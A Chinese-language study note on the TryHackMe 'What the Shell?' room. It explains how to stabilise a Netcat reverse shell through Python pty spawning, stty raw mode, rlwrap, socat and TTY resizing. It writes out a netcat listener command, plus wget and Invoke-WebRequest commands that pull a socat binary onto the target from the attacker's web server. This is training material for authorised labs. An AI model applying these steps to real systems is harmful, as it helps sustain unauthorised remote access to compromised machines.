> [!info] LINK & TAG
> [TryHackMe | What the Shell?](https://tryhackme.com/room/introtoshells)
> 
> #tag
## Netcat Shell 穩定化技術筆記 (Linux/Windows)

### 0. 前言：為什麼需要穩定化？

預設的 Netcat shell 非常不穩定，具有以下缺點：

- 按下 `Ctrl + C` 會直接關閉整個連線。
    
- 非交互式（Non-interactive），經常出現排版錯誤。
    
- 無法使用 Tab 自動補全或方向鍵。
    
- 這本質上是在終端機內執行的「進程」，而非真正的終端機。
    

---

### 技術 1：Python (僅限 Linux)

這是最常見的三階段穩定化方法，前提是目標主機必須安裝 Python。

1. 提升 Bash 功能：
    
    在 shell 中輸入：
    
    Bash
    
    ```
    python -c 'import pty;pty.spawn("/bin/bash")'
    ## 若 python 不存在，請嘗試 python2 或 python3
    ```
    
2. **設定終端類型：**
    
    Bash
    
    ```
    export TERM=xterm
    ## 這能讓你使用 clear 等終端指令
    ```
    
3. **接管本地終端控制：**
    
    - 按下 `Ctrl + Z` 將 shell 移至背景。1
        
    - 在**本地主機**輸入：
        
        Bash
        
        ```
        stty raw -echo; fg
        ```
        
    - 這會關閉本地終端的輸入回顯，讓你能使用 Tab、方向鍵和 `Ctrl + C` 而不中斷連線。
        

> **注意：** 如果 shell 意外斷開，本地終端可能會看不到輸入內容。請輸入 `reset` 並回車即可恢復。2

---

### 技術 2：rlwrap (適用於 Windows/Linux)

`rlwrap` 是一個包裝程式，能立即提供歷史紀錄、Tab 補全和方向鍵功能。

1. **安裝：**
    
    Bash
    
    ```
    sudo apt install rlwrap
    ```
    
2. **啟動監聽器：**
    
    Bash
    
    ```
    rlwrap nc -lvnp <port>
    ```
    
3. 進一步穩定 (Linux)：
    
    配合 Ctrl + Z 與 stty raw -echo; fg（同技術 1 步驟 3）可達成完全穩定。
    

---

### 技術 3：Socat (僅限 Linux)

將 Netcat shell 作為「跳板」，升級成功能更全的 Socat shell。

1. **傳輸 Socat 二進制文件：**
    
    - **攻擊機**啟動 Web Server：`sudo python3 -m http.server 80`
        
    - **目標機**下載：
        
        - Linux: `wget <LOCAL-IP>/socat -O /tmp/socat`
            
        - Windows: `Invoke-WebRequest -uri <LOCAL-IP>/socat.exe -outfile C:\Windows\temp\socat.exe`
            
2. **優點：** 這種方法能提供更穩定的交互體驗，但對於 Windows 目標，Socat 的穩定性提升有限。
    

---

### 進階調整：調整終端 TTY 尺寸

如果你需要使用 `vim` 或 `nano` 等文本編輯器，必須手動對齊行列數。

1. **在本地終端查看尺寸：**
    
    Bash
    
    ```
    stty -a
    ## 記下其中的 rows <數字> 和 columns <數字>
    ```
    
2. **在反彈 Shell 中設定尺寸：**
    
    Bash
    
    ```
    stty rows <數字>
    stty cols <數字>
    ```
    

---

### 總結表格

| **技術**     | **適用系統**      | **優點**              | **缺點**       |
| ---------- | ------------- | ------------------- | ------------ |
| **Python** | Linux         | 最常用、無需額外安裝工具        | 步驟較繁瑣        |
| **rlwrap** | Windows/Linux | Windows 最佳選擇、支持歷史紀錄 | 需預先安裝 rlwrap |
| **Socat**  | Linux         | 功能最強大               | 需傳輸二進制文件到目標機 |